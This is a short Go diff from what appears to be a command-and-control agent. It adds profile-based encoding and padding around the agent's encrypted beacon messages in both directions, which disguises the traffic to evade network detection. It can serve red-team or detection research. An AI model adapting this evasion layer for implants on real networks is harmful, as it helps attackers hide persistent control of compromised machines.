@@ -228,6 +228,14 @@ func runSession(host string, port int, agentID, caFP string, beaconSec int, prof
 		if err != nil {
 			return fmt.Errorf("decrypt: %w", err)
 		}
+		if activeProfile != nil {
+			plain = c2profile.StripPadding(plain)
+			dec, err := activeProfile.DecodeBody(plain)
+			if err != nil {
+				return fmt.Errorf("decode body: %w", err)
+			}
+			plain = dec
+		}
 		var env proto.Envelope
 		if err := json.Unmarshal(plain, &env); err != nil {
 			return fmt.Errorf("envelope: %w", err)
@@ -530,6 +538,13 @@ func sendEncrypted(conn net.Conn, sess *crypto.Session, t proto.MessageType, pay
 	envBytes, err := json.Marshal(env)
 	if err != nil {
 		return err
+	}
+	if activeProfile != nil {
+		body, err := activeProfile.EncodeBody(envBytes)
+		if err != nil {
+			return fmt.Errorf("encode body: %w", err)
+		}
+		envBytes = activeProfile.PadBody(body)
 	}
 	enc, err := sess.Encrypt(envBytes)
 	if err != nil {
